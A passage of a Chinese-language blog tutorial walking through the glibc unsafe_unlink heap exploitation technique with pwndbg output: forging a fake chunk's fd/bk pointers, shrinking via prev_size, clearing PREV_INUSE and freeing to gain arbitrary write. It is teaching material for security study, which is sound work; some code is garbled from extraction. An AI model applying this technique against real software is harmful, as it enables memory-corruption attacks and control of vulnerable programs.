    0x6020b0:       0x0000000000000000      0x0000000000000000
    pwndbg> x/10gx 0x603010
    0x603010:       0x0000000000000000      0x0000000000000000
    0x603020:       0x0000000000602058      0x0000000000000000
    0x603030:       0x0000000000000000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000000
    0x603050:       0x0000000000000000      0x0000000000000000
为便于理解,这里我一共输出了五样东西
可以看到,程序将chunk0_ptr[2]的值变成了chunk0_ptr-0x18的地址
记得之前所说的吗,我们需要在chunk0中伪造一个fake chunk
我们的chunk0_ptr是从0x603000开始的,但是我们要清楚的是给用户的指针却是从0x603010开始的(这其实也是glibc的机制,这里就不详述了).结合程序注释,这也就意味着我们所伪造的fake
chunk要从0x603010开始,以0x603020为fd指针,以0x603028为bk指针
此时我们的fd指针已经伪造好了,下面我们直接结束伪造bk指针的部分,此时的堆
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 145,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x602058,
      bk_nextsize = 0x602060 
    }
    0x603090 PREV_INUSE {
      prev_size = 0,
      size = 145,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> x/10gx 0x603010
    0x603010:       0x0000000000000000      0x0000000000000000
    0x603020:       0x0000000000602058      0x0000000000602060
    0x603030:       0x0000000000000000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000000
    0x603050:       0x0000000000000000      0x0000000000000000
好了,此时我们已经成功的伪造了我们fake
chunk的fd和bk指针,程序注释说我们这样就可以成功bypass那两个条件,也就是P->FD->BK=P&&P->BK->FD=P了,这是为什么呢?
我们现在假设我们的fake_chunk的size已经设好了,并且他的fd=0x602058,bk=0x602060,那么
fake_chunk->fd->bk是多少呢?我们看一下
    pwndbg> x/10gx 0x602058
    0x602058:       0x0000000000000000      0x00007ffff7dd2540
    0x602068 :      0x0000000000000000      0x0000000000603010fd->bk=0x603010,还记得我们刚刚所说的吗,我们所伪造的fake_chunk就是0x603010
因此第一个条件fake_chunk->fd->bk=fake_chunk达成,同理我们康康第二个条件
    pwndbg> x/10gx 0x602060
    0x602060 : 0x00007ffff7dd2540      0x0000000000000000
    0x602070 :  0x0000000000603010      0x0000000000000000
    0x602080:       0x0000000000000000      0x0000000000000000
    0x602090:       0x0000000000000000      0x0000000000000000
    0x6020a0:       0x0000000000000000      0x0000000000000000
同样的,我们成功达成了第二个条件,此时的fake_chunk也就是指向我们全局变量的chunk0_ptr已经可以bypass了,现在值得注意的是刚刚我们假设size已经设好了,但其实并没有
那么根据程序所说,假设我们可以溢出chunk0来自由的更改chunk1的内容,我们就可以通过更改chunk1的pre_size域来使得我们的chunk收缩以骗过malloc让他认为我们的chunk1的上一个chunk是从我们的fake
chunk处开始的
emmmm,关于heap
shrink,可以康康我之前的另一篇[文章](https://nightrainy.github.io/2019/07/25/chunk-extend-and-overlapping/)
拓展和收缩原理相同:)
好了,我们继续
      36   uint64_t *chunk1_hdr = chunk1_ptr - header_size;
     ► 37   fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.n");
现在程序运行到了这里,之前程序所定义的header_size是2,那么chunk1_ptr-2是什么东西呢?
    pwndbg> p/x chunk1_ptr -2
    $23 = 0x603090
    pwndbg> p/x chunk1_ptr
    $24 = 0x6030a0
    pwndbg> p/x 0x6030a0-0x603090
    $25 = 0x10
这里需要注意哦,指针的加减和平常的加减不太一样,这里我也写了个小demo,其实是从之前的文章里扒来的
demo.c
    #include 
    #include 
    #include 
    #include 
    int main()
    {
            long long *chunk1,*chunk2;
            chunk1=malloc(0x80);
            chunk2=malloc(0x80);
            chunk1=100;
            chunk2=200;
            printf("%pn",&chunk1);
            printf("%pn",chunk1);
            printf("%pn",&chunk2);
            printf("%pn",chunk2);
            printf("%pn",chunk1-3);
            printf("%pn",chunk1-2);
            printf("%pn",chunk1-1);
            printf("%pn",&chunk1-3);
            printf("%pn",&chunk1-2);
            printf("%pn",&chunk1-1);
    }
编译运行结果
    '╰─# ./test
    0x7ffdd51db3f8
    0x64
    0x7ffdd51db400
    0xc8
    0x4c
    0x54
    0x5c
    0x7ffdd51db3e0 //chunk1-3
    0x7ffdd51db3e8 //chunk1-2
    0x7ffdd51db3f0 //chunk1-1
从小demo里就可以稍微理解指针加减了叭(雾
好的,下面我们继续分析.
程序做了什么呢?
程序将chunk1_ptr向前16位的地址赋给了我们的chunk1_hdr,这是做什么呢?
我们知道程序给我们的用户指针其实是free chunk的fd指针,因此向前16就意味着是chunk的pre_size域
我们继续让程序执行到给他赋值的地方,此时答案呼之欲出,这里的作用就是为了实现我们刚刚所说的堆缩,heap shrink:)
我们看下现在的堆
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x602058,
      bk_nextsize = 0x602060 
    }
    0x603090 PREV_INUSE {
      prev_size = 0x80,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
看到了吗,这里chunk1的prev_size已经被设为了0x80,这也就意味着系统向前找chunk的时候会向前0x80找到我们的fake_chunk
    pwndbg> p/x 0x603090-0x80
    $27 = 0x603010
但这并不够,我们需要伪造chunk1是free态的chunk,那么只需要把标志位设位0就好了,程序继续运行到下一断点
       42   chunk1_hdr[1] &= ~1;
这里是一个赋0的操作
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x602058,
      bk_nextsize = 0x602060 
    }
    0x603090 {
      prev_size = 0x80,
      size = 0x90,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
好了,万事具备,只欠东风:)
free chunk1,这时就会发生unlink(为什么请看文章开头unlink时机
这里就是触发了free的后向合并从而调用unlink函数,此时的堆结构
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 145,
      fd = 0x0,
      bk = 0x20ff1,
      fd_nextsize = 0x602058,
      bk_nextsize = 0x602060 
    }
    0x603090 {
      prev_size = 128,
      size = 144,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
我们现在给chunk0_ptr[3]赋值,将chunk0_ptr[3]指向victim_string的内存
    pwndbg> p/x &victim_string
    $40 = 0x7fffffffe640
    pwndbg> p/x chunk0_ptr
    $31 = 0x7fffffffe640
    pwndbg> p/x chunk0_ptr[3]
    $37 = 0x7ffff7a2d830
这时我们可以发现,我们虽然修改的是chunk0_ptr[3],但其实修改的是chunk0_ptr的值
让程序继续跑,修改一下chunk0_ptr的值
    pwndbg> p victim_string
    $63 = "BBBBAAAA"
完美:)
## 总结
依旧,程序先是弄了一个全局变量chunk0_ptr,紧接着给他申请了0x80实际上是0x90的内存空间
之后新建了一个大小一样的chunk1_ptr
这时我们要确定的是我们的全局指针是chunk0_ptr,要攻击的chunk是chunk1_ptr
之后程序构造了P->FD->BK=P和P->BK->FD=P的条件,想要伪造一个fake_chunk
假设我们拥有溢出的能力,修改chunk1_ptr的pre_size域让系统认为我们的上一个chunk是我们伪造的fake
chunk,并且将chunk1_ptr的size域标志位置0以伪造其被free的假象
然后程序free掉了chunk1触发了free的后向合并从而调用了unlink函数,此时我们的攻击就算结束了
而程序的攻击效果就是将本来是P处的指针变为了P-0x18的指针,我们就拥有了任意内存读写的能力,over~